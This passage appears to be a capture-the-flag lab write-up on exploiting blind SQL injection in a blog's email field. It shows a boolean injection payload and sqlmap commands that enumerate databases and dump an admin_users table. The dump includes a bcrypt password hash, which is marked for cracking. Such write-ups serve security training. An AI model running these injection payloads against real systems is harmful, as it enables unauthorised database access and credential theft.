
## DATABASES

My first approach was to simply try bruteforcing this with a simple script:

```python
"' OR EXISTS (SELECT * FROM information_schema.schemata WHERE schema_name LIKE BINARY '{database}%' ) -- - "
```
```txt
Final values are the following
['usage', 'information', 'performance']
```

However, i noticed there were several tables and databases, so i started using sqlmap instead (much faster anyway)

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request -p email --risk 3 --level 5 --batch --threads 8 --dbs --tables
        ___

...

available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[07:04:43] [INFO] fetching tables for databases: 'information_schema, performance_schema, usage_blog'
[07:04:43] [INFO] fetching number of tables for database 'usage_blog'
[07:04:43] [INFO] retrieved: 15
[07:04:53] [INFO] retrieving the length of query output
[07:04:53] [INFO] retrieved: 10
[07:05:17] [INFO] retrieved: admin_menu             
[07:05:17] [INFO] retrieving the length of query output
[07:05:17] [INFO] retrieved: 19
[07:05:54] [INFO] retrieved: admin_operation_log             
[07:05:54] [INFO] retrieving the length of query output
[07:05:54] [INFO] retrieved: 17
[07:06:27] [INFO] retrieved: admin_permissions             
[07:06:27] [INFO] retrieving the length of query output
[07:06:27] [INFO] retrieved: 15
[07:07:59] [INFO] retrieved: admin_role_menu             
[07:07:59] [INFO] retrieving the length of query output
[07:07:59] [INFO] retrieved: 22
[07:10:47] [INFO] retrieved: admin_role_permissions             
[07:10:47] [INFO] retrieving the length of query output
[07:10:47] [INFO] retrieved: 
16
[07:13:32] [INFO] retrieved: admin_role_users             
[07:13:32] [INFO] retrieving the length of query output
[07:13:32] [INFO] retrieved: 11
[07:15:56] [INFO] retrieved: admin_roles             
[07:15:56] [INFO] retrieving the length of query output
[07:15:56] [INFO] retrieved: 22
[07:18:38] [INFO] retrieved: admin_user_permissions             
[07:18:38] [INFO] retrieving the length of query output
[07:18:38] [INFO] retrieved: 11
[07:20:25] [INFO] retrieved: admin_users             
[07:20:25] [INFO] retrieving the length of query output
[07:20:25] [INFO] retrieved: 4
[07:21:45] [INFO] retrieved: blog           
[07:21:45] [INFO] retrieving the length of query output
[07:21:45] [INFO] retrieved: 11
[07:23:32] [INFO] retrieved: failed_jobs             
[07:23:32] [INFO] retrieving the length of query output
[07:23:32] [INFO] retrieved: 10
[07:25:45] [INFO] retrieved: migrations             
[07:25:45] [INFO] retrieving the length of query output
[07:25:45] [INFO] retrieved: 21
[07:29:03] [INFO] retrieved: password_reset_tokens             
[07:29:03] [INFO] retrieving the length of query output

...

```


```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r request -p email --risk 3 --level 5 --batch --threads 8 -D "usage_blog" -T "admin_users" --dump --columns

Database: usage_blog
Table: admin_users
[8 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| name           | varchar(255) |
| avatar         | varchar(255) |
| created_at     | timestamp    |
| id             | int unsigned |
| password       | varchar(60)  |
| remember_token | varchar(100) |
| updated_at     | timestamp    |
| username       | varchar(190) |
+----------------+--------------+

########################################################################

+--------------------------------------------------------------+
| name                                                         |
+--------------------------------------------------------------+
| Administrator                                                |
+--------------------------------------------------------------+
| password                                                     |
+--------------------------------------------------------------+
| $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+--------------------------------------------------------------+
| username                                                     |
+--------------------------------------------------------------+
| admin                                                        |
+--------------------------------------------------------------+

```

We now have another password to [[crack]]